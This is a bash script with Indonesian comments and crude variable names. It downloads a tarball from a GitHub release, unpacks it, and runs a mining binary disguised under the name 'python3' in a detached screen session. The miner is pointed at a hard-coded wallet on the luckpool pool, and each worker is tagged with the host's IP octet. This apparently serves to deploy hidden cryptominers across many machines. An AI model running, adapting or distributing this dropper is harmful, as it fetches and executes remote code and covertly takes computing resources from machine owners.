#!/bin/bash

IPNA=$(curl -s ifconfig.me)

# Mengambil bagian belakang IP (oktet terakhir)
MEKI=$(echo "$IPNA" | cut -d '.' -f 4)

# Nama file yang akan diunduh
FILE="KONTOL"
URL="https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz"
EXTRACTED_DIR="dotsrb"  # Nama folder hasil ekstraksi

# Fungsi untuk menampilkan efek loading
loading() {
    local name="Mengunduh $FILE"
    local pid=$1
    local delay=0.75
    local spin='/-\|'
    local i=0

    echo -n "$name "
    while ps -p $pid > /dev/null; do
        # Menggunakan modulo untuk berputar karakter spin
        echo -ne "\r$name ${spin:i%4:1}" 
        sleep $delay
        ((i++))
    done
    echo -ne "\r$name selesai!\n"
}

# Cek apakah folder sudah ada
if [ -d "$EXTRACTED_DIR" ]; then
    echo "Folder $EXTRACTED_DIR sudah ada. Tidak perlu mengunduh ulang."
else
    # Cek apakah file sudah ada
    if [ -f "$FILE" ]; then
        echo "File $FILE sudah ada. Mengunduh ulang..."
        wget -q -O "$FILE" "$URL" &
        loading $!
    else
        # Download file jika belum ada
        echo "Mengunduh $FILE..."
        wget -q -O "$FILE" "$URL" &
        loading $!
    fi

    # Ekstrak file
    echo "Ekstrak file $FILE..."
    tar -xvf "$FILE" > /dev/null 2>&1
    echo "Ekstraksi selesai."
fi

screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool ap.luckpool.net:3956 --wallet RNUQQ8AFB2nDj81jjqHPKKqM8T7FwMm29p.TITIT-$MEKI
